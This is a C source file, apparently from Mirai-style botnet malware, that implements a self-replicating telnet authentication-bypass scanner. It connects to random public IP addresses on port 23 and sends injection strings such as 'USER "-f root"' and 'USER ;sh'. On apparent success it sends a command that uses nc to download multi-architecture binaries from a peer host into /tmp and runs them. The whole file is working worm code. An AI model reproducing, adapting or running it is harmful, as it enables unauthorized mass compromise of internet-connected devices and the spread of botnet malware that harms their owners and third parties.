/*
 * Telnet Authentication Bypass Scanner
 * Exploits: USER="-f root" telnet -a vulnerability
 * Scans port 23, bypasses auth, downloads binaries via P2P
 */

#include "includes.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define TELNETBYPASS_MAX_CONNS 128
#define TELNETBYPASS_PORT 23

#define TB_CLOSED 0
#define TB_CONNECTING 1
#define TB_CONNECTED 2
#define TB_SEND_USER 3
#define TB_SEND_PASS 4
#define TB_AUTHENTICATED 5
#define TB_UPLOAD_PAYLOAD 6

struct tb_conn {
    int fd;
    ipv4_t dst;
    uint16_t port;
    uint8_t state;
    time_t last;
    char rdbuf[2048];
    int rdbuf_pos;
};

static struct tb_conn conns[TELNETBYPASS_MAX_CONNS];
static int conn_count = 0;

/* Telnet authentication bypass payloads */
static char *bypass_attempts[] = {
    "USER \"-f root\"\r\n",
    "USER -f root\r\n",
    "USER \"-fadmin\"\r\n",
    "USER -fadmin\r\n",
    "USER \"-f\"\r\n",
    "USER -f\r\n",
    "USER \";sh\"\r\n",
    "USER ;sh\r\n",
    NULL
};

static ipv4_t get_rand_ip(void);
static void tb_connect(struct tb_conn *);
static void tb_close(struct tb_conn *);
static void tb_send_bypass(struct tb_conn *);
static void tb_send_payload(struct tb_conn *);

void telnetbypass_scanner_init(void) {
    if (fork() == 0) {
        int i;
        for (i = 0; i < TELNETBYPASS_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = TB_CLOSED;
        }
        
        while (TRUE) {
            fd_set fds;
            struct timeval tv;
            int mf = 0;
            
            FD_ZERO(&fds);
            for (i = 0; i < TELNETBYPASS_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fds);
                    if (conns[i].fd > mf) mf = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            select(mf + 1, &fds, NULL, NULL, &tv);
            
            time_t now = time(NULL);
            
            /* Check timeouts */
            for (i = 0; i < TELNETBYPASS_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last > 15) {
                    tb_close(&conns[i]);
                }
            }
            
            /* Process readable sockets */
            for (i = 0; i < TELNETBYPASS_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fds)) {
                    char buf[4096];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    
                    if (n <= 0) {
                        tb_close(&conns[i]);
                        continue;
                    }
                    
                    conns[i].last = now;
                    
                    /* Store response */
                    if (conns[i].rdbuf_pos + n < sizeof(conns[i].rdbuf)) {
                        memcpy(conns[i].rdbuf + conns[i].rdbuf_pos, buf, n);
                        conns[i].rdbuf_pos += n;
                    }
                    
                    /* State machine */
                    switch (conns[i].state) {
                        case TB_CONNECTED:
                            /* Server sent banner, try bypass */
                            tb_send_bypass(&conns[i]);
                            break;
                            
                        case TB_SEND_USER:
                        case TB_SEND_PASS:
                            /* Check for auth success */
                            if (strstr(conns[i].rdbuf, "#") ||
                                strstr(conns[i].rdbuf, "$") ||
                                strstr(conns[i].rdbuf, "login:") == NULL) {
                                conns[i].state = TB_AUTHENTICATED;
                                tb_send_payload(&conns[i]);
                            } else if (strstr(conns[i].rdbuf, "Login") ||
                                       strstr(conns[i].rdbuf, "Password") ||
                                       strstr(conns[i].rdbuf, "login:")) {
                                /* Bypass failed, close */
                                tb_close(&conns[i]);
                            }
                            break;
                            
                        case TB_UPLOAD_PAYLOAD:
                            tb_close(&conns[i]);
                            break;
                    }
                    
                    conns[i].rdbuf_pos = 0;
                }
            }
            
            /* Start new connections */
            if (conn_count < TELNETBYPASS_MAX_CONNS / 2) {
                for (i = 0; i < TELNETBYPASS_MAX_CONNS; i++) {
                    if (conns[i].state == TB_CLOSED) {
                        conns[i].dst = get_rand_ip();
                        conns[i].port = TELNETBYPASS_PORT;
                        conns[i].rdbuf_pos = 0;
                        tb_connect(&conns[i]);
                        conn_count++;
                        break;
                    }
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_rand_ip(void) {
    ipv4_t a;
    while (TRUE) {
        a = rand_next();
        uint8_t f = (a >> 24) & 0xFF;
        
        /* Skip private/reserved ranges */
        if (f == 0 || f == 127) continue;
        if (f == 10) continue;
        if (f == 172) {
            uint8_t s = (a >> 16) & 0xFF;
            if (s >= 16 && s < 32) continue;
        }
        if (f == 192) {
            uint8_t s = (a >> 16) & 0xFF;
            if (s == 168) continue;
        }
        
        /* Focus on public ranges */
        if (f >= 100 && f <= 223) break;
    }
    return a;
}

static void tb_connect(struct tb_conn *c) {
    struct sockaddr_in addr;
    
    c->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (c->fd == -1) {
        c->state = TB_CLOSED;
        return;
    }
    
    fcntl(c->fd, F_SETFL, O_NONBLOCK);
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = c->dst;
    addr.sin_port = htons(c->port);
    
    if (connect(c->fd, (struct sockaddr *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS) {
        close(c->fd);
        c->fd = -1;
        c->state = TB_CLOSED;
        return;
    }
    
    c->state = TB_CONNECTING;
    c->last = time(NULL);
}

static void tb_send_bypass(struct tb_conn *c) {
    /* Send telnet negotiation */
    uint8_t iac[] = {0xFF, 0xFB, 0x01, 0xFF, 0xFB, 0x03, 0xFF, 0xFC, 0x22};
    send(c->fd, iac, sizeof(iac), 0);
    
    /* Try authentication bypass */
    send(c->fd, "USER \"-f root\"\r\n", 17, 0);
    sleep(1);
    send(c->fd, "PASS \"-f root\"\r\n", 17, 0);
    
    c->state = TB_SEND_USER;
    c->last = time(NULL);
}

static void tb_send_payload(struct tb_conn *c) {
    ipv4_t seed = rand_next();
    char cmd[1024];
    
    /* Multi-arch P2P download */
    snprintf(cmd, sizeof(cmd),
        "cd /tmp;"
        "for arch in arm mips mpsl x86 arm7 x86_64 ppc spc; do "
        "rm -f axis.$arch;"
        "for i in 0 1 2 3 4 5 6 7; do "
        "printf '\\040\\000\\000$arch' | nc -u -w1 %d.%d.%d.%d 49153 >> axis.$arch 2>/dev/null;"
        "done;"
        "chmod +x axis.$arch 2>/dev/null;"
        "done;"
        "for arch in arm mips mpsl x86 arm7 x86_64 ppc spc; do "
        "test -s axis.$arch && ./axis.$arch & done\r\n",
        LOCAAL_ADDR(seed), LOCAAL_ADDR_1(seed),
        LOCAAL_ADDR_2(seed), LOCAAL_ADDR_3(seed));
    
    send(c->fd, cmd, strlen(cmd), 0);
    c->state = TB_UPLOAD_PAYLOAD;
    c->last = time(NULL);
}

static void tb_close(struct tb_conn *c) {
    if (c->fd != -1) {
        close(c->fd);
        c->fd = -1;
    }
    c->state = TB_CLOSED;
    if (conn_count > 0) conn_count--;
}

#endif
